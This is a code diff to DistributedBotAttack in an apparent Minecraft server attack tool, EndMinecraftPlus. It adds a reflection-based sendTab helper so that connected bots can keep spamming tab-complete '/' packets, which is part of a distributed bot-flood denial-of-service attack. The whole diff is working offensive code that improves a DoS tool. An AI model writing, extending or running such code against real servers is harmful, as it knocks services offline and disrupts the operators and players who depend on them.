@@ -3,6 +3,8 @@ package luohuayu.EndMinecraftPlus.tasks.attack;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.Socket;
@@ -18,6 +20,7 @@ import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
 import org.spacehq.packetlib.Client;
+import org.spacehq.packetlib.Session;
 import org.spacehq.packetlib.event.session.ConnectedEvent;
 import org.spacehq.packetlib.event.session.DisconnectedEvent;
 import org.spacehq.packetlib.event.session.DisconnectingEvent;
@@ -78,7 +81,7 @@ public class DistributedBotAttack extends IAttack {
 						clients.forEach(c->{
 							if(c.getSession().isConnected()) {
 								if(c.getSession().hasFlag("join")) {
-									c.getSession().send(new ClientTabCompletePacket("/"));
+									sendTab(c.getSession(),"/");
 								}
 							}
 						});
@@ -202,5 +205,20 @@ public class DistributedBotAttack extends IAttack {
 			socket.close();
 		} catch (IOException e) {}
 		return false;
+	}
+	
+	public void sendTab(Session session,String text) {
+		try {
+			Class<?> cls=ClientTabCompletePacket.class;
+			Constructor<?> constructor=cls.getDeclaredConstructor();
+			constructor.setAccessible(true);
+			ClientTabCompletePacket packet=(ClientTabCompletePacket) constructor.newInstance();
+			Field field = cls.getDeclaredField("text");
+			field.setAccessible(true);
+			field.set(packet,text);
+			session.send(packet);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 }
